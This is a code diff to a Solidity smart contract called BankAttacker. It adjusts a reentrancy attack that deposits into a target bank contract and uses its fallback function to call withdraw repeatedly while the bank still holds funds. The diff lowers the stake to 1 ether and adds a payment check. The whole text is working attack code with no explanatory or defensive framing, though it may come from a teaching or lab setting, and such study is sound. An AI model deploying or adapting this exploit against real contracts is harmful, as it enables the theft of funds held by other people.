@@ -16,14 +16,15 @@ contract BankAttacker {
     }
 
     function attackIt() public payable {
-        require(bank.balance > 10 ether);
-        IBank(bank).deposit{value : 9 ether}();
-        IBank(bank).withdraw(9 ether);
+        require(bank.balance > 1 ether);
+        require(msg.value >= 1 ether);
+        IBank(bank).deposit{value : 1 ether}();
+        IBank(bank).withdraw(1 ether);
     }
 
     fallback() external payable {
-        if (bank.balance > 10 ether) {
-            IBank(bank).withdraw(9 ether);
+        if (bank.balance > 1.1 ether) {
+            IBank(bank).withdraw(1 ether);
         }
     }
 }
